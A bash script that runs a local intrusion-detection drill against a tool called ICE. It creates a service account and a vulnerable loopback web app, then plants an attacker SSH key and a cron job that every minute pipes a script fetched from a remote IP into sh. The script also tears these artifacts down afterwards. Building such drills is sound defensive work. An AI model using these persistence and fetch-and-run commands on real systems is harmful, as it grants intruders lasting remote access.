#!/usr/bin/env bash
# Exercise target driver (plan §5 / §8.2). Authorized local drill only.
#   sudo target.sh setup      create the websvc service account + start the vulnerable web app
#   sudo target.sh attack     "exploit" the app so websvc plants host-visible persistence (the intrusion)
#   sudo target.sh teardown   remove the account, service, and all drill artifacts
#
# The attack runs INSIDE the web app process (as websvc), triggered over a loopback socket, so ICE
# sees the intrusion with service-account provenance and no developer/sudo/ice.exercise fingerprint.
set -uo pipefail
HERE="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
SVC_USER=websvc
SVC_HOME=/home/websvc
APP_DIR=/opt/webapp                      # outside the ICE repo, so the process looks like a generic web app
PORT=9009
# Fresh IOCs (not the earlier drill's butter/persistevil), so investigation log lookups stay clean.
C2_IP=45.133.1.7
C2_URL="http://$C2_IP/update.sh"

[ "$(id -u)" -eq 0 ] || { echo "run with sudo" >&2; exit 1; }

case "${1:-}" in
setup)
  id "$SVC_USER" >/dev/null 2>&1 || useradd -m -d "$SVC_HOME" -s /usr/sbin/nologin -c "internal web app" "$SVC_USER"
  mkdir -p "$APP_DIR"; install -m 0755 "$HERE/webapp.py" "$APP_DIR/app.py"; chown -R "$SVC_USER" "$APP_DIR"
  # Already-running service, detached from this shell (parent = init), as the low-priv account.
  if ! ss -ltn | grep -q "127.0.0.1:$PORT "; then
    setsid sudo -u "$SVC_USER" env HOME="$SVC_HOME" VICTIM_PORT="$PORT" /usr/bin/python3 "$APP_DIR/app.py" \
      >/var/log/webapp.log 2>&1 < /dev/null &
    sleep 1
  fi
  ss -ltn | grep -q "127.0.0.1:$PORT " && echo "victim 'webapp' up as $SVC_USER on 127.0.0.1:$PORT" || { echo "victim failed to start; see /var/log/webapp.log" >&2; exit 1; }
  ;;

attack)
  command -v nc >/dev/null || { echo "nc (netcat) required" >&2; exit 1; }
  # The "external exploit": send intrusion commands to the vulnerable app. They execute as websvc,
  # as children of the app process — this is what ICE observes on the host.
  payload=$(cat <<EOF
mkdir -p $SVC_HOME/.ssh && chmod 700 $SVC_HOME/.ssh
ssh-keygen -t ed25519 -N '' -q -f /tmp/.k 2>/dev/null; cat /tmp/.k.pub | sed 's/ .*/ intruder@evil/' >> $SVC_HOME/.ssh/authorized_keys; rm -f /tmp/.k /tmp/.k.pub
chmod 600 $SVC_HOME/.ssh/authorized_keys
printf '* * * * * curl -fsSL $C2_URL | sh\n' | crontab -
id > /tmp/.webapp_cache 2>&1
EOF
)
  echo "$payload" | nc -q1 127.0.0.1 "$PORT" >/dev/null 2>&1 || echo "$payload" | nc -w1 127.0.0.1 "$PORT" >/dev/null 2>&1
  sleep 2
  echo "=== intrusion planted as $SVC_USER; what ICE will see on the host: ==="
  osqueryi --json "select command,path from crontab where path like '%$SVC_USER%'; select u.username,k.algorithm,k.comment from users u join authorized_keys k using(uid) where u.username='$SVC_USER'" 2>/dev/null
  crontab -u "$SVC_USER" -l 2>/dev/null | sed 's/^/  cron: /'
  ;;

teardown)
  pkill -u "$SVC_USER" 2>/dev/null; sleep 1
  crontab -u "$SVC_USER" -r 2>/dev/null
  userdel -r "$SVC_USER" 2>/dev/null && echo "removed $SVC_USER"
  rm -rf "$APP_DIR" /var/log/webapp.log /tmp/.webapp_cache
  echo "teardown complete"
  ;;

*) echo "usage: sudo target.sh {setup|attack|teardown}" >&2; exit 2 ;;
esac
